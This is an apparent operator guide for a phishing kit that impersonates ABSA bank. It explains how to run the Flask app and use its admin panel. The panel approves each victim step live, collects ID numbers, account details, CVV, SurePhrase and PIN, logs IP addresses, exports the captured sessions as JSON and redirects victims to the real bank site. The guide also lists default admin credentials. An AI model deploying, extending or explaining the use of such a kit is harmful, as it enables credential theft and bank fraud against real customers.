# Quick Demo Guide

## How to Test the System

### Step 1: Start the Application
```bash
python app.py
```
The application will be available at: http://localhost:5000

### Step 2: Test User Authentication Flow

1. **Go to the main page**: http://localhost:5000

2. **Fill Customer Information Form**:
   - ID Type: South African ID
   - ID Number: Any 13-digit number (e.g., 8001015009088)
   - Date of Birth: Any valid date
   - Account Number: Any number (e.g., 1234567890)
   - Branch Code: Any 6-digit code (e.g., 632005)
   - CVV: Any 3-digit number (e.g., 123)
   - Click Submit

3. **Wait for Admin Approval** (see Step 3 below)

4. **SurePhrase Authentication**:
   - Enter any phrase with 3+ characters (e.g., "MYSECUREPHRASE")
   - Click Submit
   - Wait for admin approval

5. **PIN Entry**:
   - Enter any 5-digit PIN (e.g., 12345)
   - Click Submit
   - Wait for admin approval

### Step 3: Admin Approval Process

1. **Open Admin Panel**: http://localhost:5000/admin

2. **Login with Admin Credentials**:
   - Username: `admin`
   - Password: `admin123`

3. **Approve User Steps**:
   - You'll see pending requests on the dashboard
   - Click "View Data" to see what the user entered
   - Click "Approve" to allow the user to proceed
   - Or click "Reject" to deny the request

4. **View Data History**:
   - Click "Data History" to see all captured sessions
   - Click "View Details" on any session to see the data
   - Click "Export" to download the data as JSON

### Step 4: Test the Complete Flow

1. Open two browser windows/tabs:
   - Tab 1: User experience (http://localhost:5000)
   - Tab 2: Admin panel (http://localhost:5000/admin)

2. Start authentication in Tab 1
3. Switch to Tab 2 to approve each step
4. Watch the real-time updates in both tabs

### What You'll See

#### User Experience:
- Professional ABSA-branded interface
- Progress through authentication steps
- Waiting screens between steps
- Final redirect to ABSA website upon completion

#### Admin Experience:
- Real-time dashboard with pending requests
- Detailed view of all user-entered data
- Approval/rejection functionality
- Data history and export capabilities
- Statistics tracking

### Sample Data for Testing

**Customer Information:**
- ID Number: 8001015009088
- Date of Birth: 01/01/1980
- Account Number: 1234567890
- Branch Code: 632005
- CVV: 123

**Authentication:**
- SurePhrase: MYSECUREPHRASE
- PIN: 12345

## Key Features to Test

1. **Data Capture**: All user inputs are captured and stored
2. **Real-time Updates**: Admin dashboard updates automatically
3. **Session Management**: Each user session is tracked separately
4. **IP Logging**: IP addresses are recorded for security
5. **Data Export**: Session data can be exported as JSON
6. **Professional UI**: Clean, ABSA-branded interface

## Security Notes

- All sensitive data (PIN, SurePhrase) is clearly marked in admin view
- Session IDs are used to track user sessions
- IP addresses are logged for security auditing
- Admin authentication is required for all data access

## Stopping the Application

Press `Ctrl+C` in the terminal to stop the Flask development server.